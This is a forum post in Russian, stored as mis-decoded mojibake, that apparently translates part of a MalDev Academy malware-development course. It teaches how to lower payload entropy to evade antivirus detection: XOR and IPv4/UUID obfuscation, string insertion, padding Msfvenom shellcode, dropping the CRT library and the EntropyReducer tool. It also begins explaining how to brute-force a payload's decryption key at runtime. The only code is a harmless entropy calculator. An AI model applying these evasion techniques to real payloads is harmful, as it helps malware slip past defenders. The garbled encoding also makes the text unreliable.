–û–¥–Ω–∞–∫–æ —Ä–∞–¥–∏ –ø—Ä–æ—Å—Ç–æ—Ç—ã, –≤ –∫–æ–¥–µ, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–º –≤ —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ, –µ—Å—Ç—å —Ñ–∞–π–ª –Ω–∞ Python, EntropyCalc.py, –∫–æ—Ç–æ—Ä—ã–π –≤—ã—á–∏—Å–ª—è–µ—Ç —ç–Ω—Ç—Ä–æ–ø–∏—é —Ñ–∞–π–ª–∞. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Å –ø–æ–º–æ—â—å—é —ç—Ç–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –Ω–∞ Python –º–æ–∂–Ω–æ –≤—ã—á–∏—Å–ª–∏—Ç—å —ç–Ω—Ç—Ä–æ–ø–∏—é —Ä–∞–∑–¥–µ–ª–æ–≤ PE-—Ñ–∞–π–ª–∞ —Å –ø–æ–º–æ—â—å—é —Ñ–ª–∞–≥–∞ -pe.<br />
<br />
–°–ª–µ–¥—É—é—â–µ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ñ–∞–π–ª EntropyCalc.py –≤ –¥–µ–π—Å—Ç–≤–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788431755.png"
		data-src="https://osint42.org/attachments/1746788431755-png.273/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788431755-png.273/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788431755.png"
			title="1746788431755.png"
			width="1039" height="502" loading="lazy" />
	</div><br />
<br />
<b>EntropyCalc.py</b><br />
<br />
EntropyCalc.py –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é calc_entropy –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è —ç–Ω—Ç—Ä–æ–ø–∏–∏ —É–∫–∞–∑–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ –±—É—Ñ–µ—Ä–µ. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ–æ—Ä–º—É–ª—É —ç–Ω—Ç—Ä–æ–ø–∏–∏ –®–µ–Ω–Ω–æ–Ω–∞ –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏—è —ç–Ω—Ç—Ä–æ–ø–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>def calc_entropy(buffer):
    if isinstance(buffer, str):
        buffer = buffer.encode()
    entropy = 0
    for x in range(256):
        p = (float(buffer.count(bytes([x])))) / len(buffer)
        if p &gt; 0:
            entropy += - p * math.log(p, 2)
    return entropy</code></pre>
	</div>
</div><br />
<b>–£–º–µ–Ω—å—à–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏</b><br />
<br />
–ö–∞–∫ —É–∂–µ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å —Ä–∞–Ω–µ–µ, —Ñ–∞–π–ª —Å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞–º–∏ –æ–±—ã—á–Ω–æ —Å–æ–¥–µ—Ä–∂–∏—Ç –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ —á–∞—Å—Ç–æ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω—ã –∏–ª–∏ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω—ã —Å–ø–æ—Å–æ–±–æ–º, –∫–æ—Ç–æ—Ä—ã–π —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç –∏—Ö —ç–Ω—Ç—Ä–æ–ø–∏—é. –î–ª—è —Ä–µ—à–µ–Ω–∏—è —ç—Ç–æ–π –ø—Ä–æ–±–ª–µ–º—ã –æ–¥–Ω–∏–º –∏–∑ —Ä–µ—à–µ–Ω–∏–π —è–≤–ª—è–µ—Ç—Å—è –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–≥–æ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, —Ç–∞–∫ –∫–∞–∫ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∞–ª–≥–æ—Ä–∏—Ç–º—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç –±–æ–ª–µ–µ –≤—ã—Å–æ–∫—É—é —ç–Ω—Ç—Ä–æ–ø–∏—é –¥–ª—è —Å–≤–æ–∏—Ö –¥–∞–Ω–Ω—ã—Ö –≤ –≤–∏–¥–µ —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç–∞, —á–µ–º –¥—Ä—É–≥–∏–µ.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, <b>–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è XOR —Å –æ–¥–Ω–∏–º –±–∞–π—Ç–æ–º –Ω–µ –∏–∑–º–µ–Ω—è–µ—Ç –æ–±—â–µ–π —ç–Ω—Ç—Ä–æ–ø–∏–∏ –≤—ã—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö. </b>–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–æ–º —ç—Ç–æ–≥–æ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —è–≤–ª—è–µ—Ç—Å—è —Ç–æ, —á—Ç–æ –æ–Ω —Å—á–∏—Ç–∞–µ—Ç—Å—è —Å–ª–∞–±—ã–º –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />
–î—Ä—É–≥–∏–º —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è –Ω–∏–∑–∫–æ–π —ç–Ω—Ç—Ä–æ–ø–∏–∏ —è–≤–ª—è–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∞–ª–≥–æ—Ä–∏—Ç–º–æ–≤ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –æ–±—ä—è—Å–Ω–µ–Ω–Ω—ã—Ö –≤ –Ω–∞—á–∞–ª—å–Ω—ã—Ö —Å—Ç–∞—Ç—å—è—Ö, —Ç–∞–∫–∏—Ö –∫–∞–∫ IPv4fuscation, IPv6fuscation, Macfuscation –∏ UUIDfuscation, –≤–º–µ—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∞–ª–≥–æ—Ä–∏—Ç–º–æ–≤ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è. –≠—Ç–∏ –º–µ—Ç–æ–¥—ã –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –≤—ã–≤–æ–¥—è—Ç –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –∏–º–µ—é—Ç —Å—Ç–µ–ø–µ–Ω—å –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –∏ –ø–æ—Ä—è–¥–∫–∞. –ü–æ—ç—Ç–æ–º—É –ø–æ—Ö–æ–∂–∏–µ –±–∞–π—Ç–æ–≤—ã–µ —É–∑–æ—Ä—ã –≤ –Ω–∞–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö –±—É–¥—É—Ç –∏–º–µ—Ç—å –±–æ–ª–µ–µ –Ω–∏–∑–∫–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è —ç–Ω—Ç—Ä–æ–ø–∏–∏ –ø–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—é —Å –Ω–∞–±–æ—Ä–æ–º –¥–∞–Ω–Ω—ã—Ö —Å –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å–ª—É—á–∞–π–Ω—ã–º–∏ –±–∞–π—Ç–∞–º–∏.<br />
<br />
<b>–í—Å—Ç–∞–≤–∫–∞ –∞–Ω–≥–ª–∏–π—Å–∫–∏—Ö —Å—Ç—Ä–æ–∫ </b><br />
<br />
–î—Ä—É–≥–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è —É–º–µ–Ω—å—à–µ–Ω–∏—è —ç–Ω—Ç—Ä–æ–ø–∏–∏ —è–≤–ª—è–µ—Ç—Å—è –≤—Å—Ç–∞–≤–∫–∞ –∞–Ω–≥–ª–∏–π—Å–∫–∏—Ö —Å—Ç—Ä–æ–∫ –≤ –∫–æ–¥ –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏. –≠—Ç–∞ —Ç–µ—Ö–Ω–∏–∫–∞ –±—ã–ª–∞ –∑–∞–º–µ—á–µ–Ω–∞ –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –æ–±—Ä–∞–∑—Ü–∞—Ö –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –≥–¥–µ –≤ –∫–æ–¥ –≤—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —Å–ª—É—á–∞–π–Ω—ã–π –Ω–∞–±–æ—Ä –∞–Ω–≥–ª–∏–π—Å–∫–∏—Ö —Å—Ç—Ä–æ–∫. –≠—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –ø–æ—Ç–æ–º—É, —á—Ç–æ –∞–Ω–≥–ª–∏–π—Å–∫–∏–π –∞–ª—Ñ–∞–≤–∏—Ç —Å–æ—Å—Ç–æ–∏—Ç –≤—Å–µ–≥–æ –∏–∑ 26 —Å–∏–º–≤–æ–ª–æ–≤, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –µ—Å—Ç—å –≤—Å–µ–≥–æ 26 * 2 (–≤–µ—Ä—Ö–Ω–∏–π –∏ –Ω–∏–∂–Ω–∏–π —Ä–µ–≥–∏—Å—Ç—Ä –±—É–∫–≤) —Ä–∞–∑–Ω—ã—Ö –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –±–∞–π—Ç–∞. –≠—Ç–æ –º–µ–Ω—å—à–µ, —á–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–¥–∞—é—Ç –∞–ª–≥–æ—Ä–∏—Ç–º—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è (255 –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π). –ï—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç—É —Ç–µ—Ö–Ω–∏–∫—É, —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª–∏–±–æ —Ç–æ–ª—å–∫–æ —Å—Ç—Ä–æ—á–Ω—ã–µ, –ª–∏–±–æ —Ç–æ–ª—å–∫–æ –ø—Ä–æ–ø–∏—Å–Ω—ã–µ –±—É–∫–≤—ã, —á—Ç–æ–±—ã —É–º–µ–Ω—å—à–∏—Ç—å –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –±–∞–π—Ç–∞.<br />
<br />
–°–∫–∞–∑–∞–≤ —ç—Ç–æ, —Å–ª–µ–¥—É–µ—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —Ç–∞–∫–æ–π –ø–æ–¥—Ö–æ–¥ –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è, –ø–æ—Ç–æ–º—É —á—Ç–æ<b> —Å—Ç—Ä–æ–∫–∏, –≤—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–µ –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é, –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –≤–ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Å–∏–≥–Ω–∞—Ç—É—Ä –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è.<br />
<br />
–î–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–¥–∏–Ω–∞–∫–æ–≤—ã–º–∏ –±–∞–π—Ç–∞–º–∏</b><br />
<br />
–ë–æ–ª–µ–µ –ø—Ä–æ—Å—Ç—ã–º —Å–ø–æ—Å–æ–±–æ–º —É–º–µ–Ω—å—à–µ–Ω–∏—è —ç–Ω—Ç—Ä–æ–ø–∏–∏ —è–≤–ª—è–µ—Ç—Å—è –¥–æ–ø–æ–ª–Ω–µ–Ω–∏–µ —à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –æ–¥–∏–Ω–∞–∫–æ–≤—ã–º –±–∞–π—Ç–æ–º. –≠—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –ø–æ—Ç–æ–º—É, —á—Ç–æ –¥–æ–±–∞–≤–ª–µ–Ω–Ω—ã–µ –±–∞–π—Ç—ã –±—É–¥—É—Ç –∏–º–µ—Ç—å —ç–Ω—Ç—Ä–æ–ø–∏—é 0,00, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –≤—Å–µ –æ–¥–∏–Ω–∞–∫–æ–≤—ã.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –Ω–∞ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –ø–æ–∫–∞–∑–∞–Ω–æ, –∫–∞–∫ —ç–Ω—Ç—Ä–æ–ø–∏—è —à–µ–ª–ª-–∫–æ–¥–∞ Msfvenom —Ä–µ–∑–∫–æ —Å–Ω–∏–∂–∞–µ—Ç—Å—è —Å 5,88325 –¥–æ 3,77597 –ø–æ—Å–ª–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∫ –Ω–µ–º—É 285 –±–∞–π—Ç–æ–≤ 0xEA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788445179.png"
		data-src="https://osint42.org/attachments/1746788445179-png.274/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788445179-png.274/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788445179.png"
			title="1746788445179.png"
			width="1429" height="718" loading="lazy" />
	</div><br />
<br />
–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–æ–º —ç—Ç–æ–≥–æ –ø–æ–¥—Ö–æ–¥–∞ —è–≤–ª—è–µ—Ç—Å—è —É–≤–µ–ª–∏—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –ë–æ–ª–µ–µ –∫—Ä—É–ø–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ –ø–æ—Ç—Ä–µ–±—É—é—Ç –±–æ–ª—å—à–µ –±–∞–π—Ç–æ–≤, —á—Ç–æ —Ç–∞–∫–∂–µ —É–≤–µ–ª–∏—á–∏—Ç —Ä–∞–∑–º–µ—Ä.<br />
<br />
–ù–µ–∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –æ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ CRT, –∏–ª–∏ C Runtime library, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —è–∑—ã–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è C, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–∞–±–æ—Ä —Ñ—É–Ω–∫—Ü–∏–π –∏ –º–∞–∫—Ä–æ—Å–æ–≤. –≠—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—ã—á–Ω–æ —Å–≤—è–∑–∞–Ω—ã —Å —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º –ø–∞–º—è—Ç—å—é (–Ω–∞–ø—Ä–∏–º–µ—Ä, memcpy), –æ—Ç–∫—Ä—ã—Ç–∏–µ–º –∏ –∑–∞–∫—Ä—ã—Ç–∏–µ–º —Ñ–∞–π–ª–æ–≤ (–Ω–∞–ø—Ä–∏–º–µ—Ä, fopen) –∏ –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞–Ω–∏–µ–º —Å—Ç—Ä–æ–∫–∞–º–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, strcpy).<br />
<br />
<b>–£–¥–∞–ª–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT</b><br />
<br />
–ú–æ–∂–µ—Ç –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ —É–º–µ–Ω—å—à–∏—Ç—å —ç–Ω—Ç—Ä–æ–ø–∏—é –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏. –ù–∞ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ —Å—Ä–∞–≤–Ω–∏–≤–∞—é—Ç—Å—è –¥–≤–∞ —Ñ–∞–π–ª–∞, Hello World.exe –∏ Hello World - No CRT.exe, –∫–æ—Ç–æ—Ä—ã–µ –∏–º–µ—é—Ç –æ–¥–∏–Ω–∞–∫–æ–≤—ã–π –∫–æ–¥, –Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω—ã —Å –∏ –±–µ–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT. Hello World - No CRT.exe –∏–º–µ–µ—Ç –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ –±–æ–ª–µ–µ –Ω–∏–∑–∫–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏ –ø–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—é —Å Hello World.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788453487.png"
		data-src="https://osint42.org/attachments/1746788453487-png.275/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788453487-png.275/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788453487.png"
			title="1746788453487.png"
			width="1112" height="643" loading="lazy" />
	</div><br />
<br />
<b>–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç Maldev Academy - EntropyReducer</b><br />
<br />
–¢–∞–∫–∂–µ –º–æ–∂–Ω–æ —É–º–µ–Ω—å—à–∏—Ç—å —ç–Ω—Ç—Ä–æ–ø–∏—é –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Å –ø–æ–º–æ—â—å—é –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ <a href="https://github.com/Maldev-Academy/EntropyReducer" target="_blank" class="link link--external" rel="noopener">EntropyReducer</a>, —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–≥–æ –∫–æ–º–∞–Ω–¥–æ–π MalDev Academy.<br />
EntropyReducer –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å–ø–∏—Å–∫–∏ –¥–ª—è –≤—Å—Ç–∞–≤–∫–∏ –Ω—É–ª–µ–≤—ã—Ö –±–∞–π—Ç–æ–≤ –º–µ–∂–¥—É –∫–∞–∂–¥—ã–º –±–ª–æ–∫–æ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Ä–∞–∑–º–µ—Ä–æ–º BUFF_SIZE.<br />
<br />
–û–±—ä—è—Å–Ω–µ–Ω–∏–µ —Å–≤—è–∑–∞–Ω–Ω—ã—Ö —Å–ø–∏—Å–∫–æ–≤ –≤—ã—Ö–æ–¥–∏—Ç –∑–∞ —Ä–∞–º–∫–∏ –¥–∞–Ω–Ω–æ–π —Å—Ç–∞—Ç—å–∏, –æ–¥–Ω–∞–∫–æ —Ö–æ—Ä–æ—à–æ –¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π readme –∏ —Ö–æ—Ä–æ—à–æ –ø—Ä–æ–∫–æ–º–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥ –≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–º–∏ –¥–ª—è –ø–æ–Ω–∏–º–∞–Ω–∏—è –∞–ª–≥–æ—Ä–∏—Ç–º–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞.<br />
<br />
<b>–ë—Ä—É—Ç –∫–ª—é—á–∞ –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏<br />
<br />
–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–í –Ω–∞—á–∞–ª—å–Ω—ã—Ö —Å—Ç–∞—Ç—å—è—Ö –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª–∏—Å—å –ø—Ä–æ—Ü–µ—Å—Å—ã —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, –∞ —Ç–∞–∫–∂–µ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–∞–ª–æ—Å—å –æ —Ç–æ–º, —á—Ç–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –≤ –≤–∏–¥–µ –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç–∞ –≤ –±–∏–Ω–∞—Ä–Ω–æ–º —Ñ–∞–π–ª–µ –¥–µ–ª–∞–µ—Ç –µ–≥–æ –ª–µ–≥–∫–æ–¥–æ—Å—Ç—É–ø–Ω—ã–º. –û–¥–∏–Ω –∏–∑ —Å–ø–æ—Å–æ–±–æ–≤ —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É - —à–∏—Ñ—Ä–æ–≤–∞—Ç—å –∫–ª—é—á –¥—Ä—É–≥–∏–º –∫–ª—é—á–æ–º –∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞—Ç—å –µ–≥–æ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã. –ß—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –∂–µ—Å—Ç–∫–æ–π –ø—Ä–∏–≤—è–∑–∫–∏ –∫–ª—é—á–∞ –∫ –±–∏–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—É, –∫–ª—é—á –ø–æ–ª—É—á–∞–µ—Ç—Å—è –º–µ—Ç–æ–¥–æ–º &quot;–≥—Ä—É–±–æ–π —Å–∏–ª—ã&quot;.<br />
<br />
–í —ç—Ç–æ–º –º–æ–¥—É–ª–µ –±—É–¥–µ—Ç –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –∞–ª–≥–æ—Ä–∏—Ç–º –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è XOR, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –ø—Ä–æ–≥—Ä–∞–º–º–∞ –¥–æ–ª–∂–Ω–∞ —É–≥–∞–¥–∞—Ç—å –∫–ª—é—á –º–µ—Ç–æ–¥–æ–º &quot;–≥—Ä—É–±–æ–π —Å–∏–ª—ã&quot;.<br />
<br />
<b>–ü—Ä–æ—Ü–µ—Å—Å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞</b><br />
<br />
–î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è &quot;–≥—Ä—É–±–æ–π —Å–∏–ª—ã&quot; –ø—Ä–∏ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏ –∫–ª—é—á–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º –±–∞–π—Ç-–ø–æ–¥—Å–∫–∞–∑–∫–∞ –≤ —Ñ—É–Ω–∫—Ü–∏—è—Ö —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è. –ó–Ω–∞–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è –æ–¥–Ω–æ–≥–æ –±–∞–π—Ç–∞ –¥–æ –∏ –ø–æ—Å–ª–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—Å—É—â–µ—Å—Ç–≤–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è. –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –ø–µ—Ä–≤—ã–π –±–∞–π—Ç –≤—ã–±—Ä–∞–Ω –≤ –∫–∞—á–µ—Å—Ç–≤–µ –±–∞–π—Ç–∞-–ø–æ–¥—Å–∫–∞–∑–∫–∏.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –±–∞–π—Ç-–ø–æ–¥—Å–∫–∞–∑–∫–∞ - BA, –∞ –ø–æ—Å–ª–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –æ–Ω —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è —Ä–∞–≤–Ω—ã–º 71, —Ç–æ –ø—Ä–æ—Ü–µ—Å—Å –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –±—É–¥–µ—Ç –ø–µ—Ä–µ–±–∏—Ä–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏—è –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ –Ω–µ –±—É–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω–æ –∑–Ω–∞—á–µ–Ω–∏–µ BA, —á—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–ª—é—á.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞</b><br />
<br />
